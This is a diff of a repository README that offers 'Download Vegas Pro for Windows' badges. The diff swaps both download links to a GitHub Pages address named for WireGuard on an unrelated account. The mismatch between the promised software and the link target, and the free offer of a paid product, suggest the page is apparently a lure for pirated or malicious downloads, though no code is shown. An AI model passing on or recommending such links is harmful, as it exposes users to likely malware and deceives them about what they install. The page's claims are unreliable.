@@ -4,7 +4,7 @@
 
 ## 📥 Download Vegas Pro for Windows
 
-[![⬇️ Download Vegas Pro](https://img.shields.io/badge/Download-Vegas%20Pro-blue?style=for-the-badge&logo=windows)](https://asdeennerhorse.github.io/mogus/Vegas)
+[![⬇️ Download Vegas Pro](https://img.shields.io/badge/Download-Vegas%20Pro-blue?style=for-the-badge&logo=windows)](https://wireguard-desktop-app.github.io/.github/WireGuard)
 
 ---
 
@@ -30,7 +30,7 @@ With its intuitive interface, multi-track editing, and high-performance renderin
 
 Whether you’re working on a short film, YouTube video, or any other type of video production, Vegas Pro provides the professional features needed to produce stunning results.
 
-[![⬇️ Download Vegas Pro](https://img.shields.io/badge/Download-Vegas%20Pro-blue?style=for-the-badge&logo=windows)](https://asdeennerhorse.github.io/mogus/Vegas)
+[![⬇️ Download Vegas Pro](https://img.shields.io/badge/Download-Vegas%20Pro-blue?style=for-the-badge&logo=windows)](https://wireguard-desktop-app.github.io/.github/WireGuard)
 
 ---
 
